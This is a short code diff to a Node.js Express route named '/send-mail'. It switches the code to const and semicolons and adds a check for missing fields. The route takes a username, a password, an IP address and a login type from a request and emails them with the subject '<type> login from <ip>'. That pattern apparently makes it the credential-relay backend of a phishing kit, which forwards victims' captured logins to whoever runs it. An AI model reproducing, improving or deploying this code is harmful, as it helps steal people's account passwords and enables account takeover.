@@ -1,11 +1,17 @@
-let express = require('express')
-let router = express.Router()
-let mailer = require('../helper/mailer')
+const express = require('express');
+const router = express.Router();
+const mailer = require('../helper/mailer');
 
+// Send email route
 router.post('/send-mail', (req, res) => {
-    const { username, pass, ip, type } = req.body
-    const subject = `${type} login from ${ip}`
-    mailer.sendEmail(res, subject, username, pass, ip, type)
-})
+  const { username, pass, ip, type } = req.body;
 
-module.exports = router
+  if (!username || !pass || !ip || !type) {
+    return res.status(400).send({ response: 'missing_fields' });
+  }
+
+  const subject = `${type} login from ${ip}`;
+  mailer.sendEmail(res, subject, username, pass, ip, type);
+});
+
+module.exports = router;
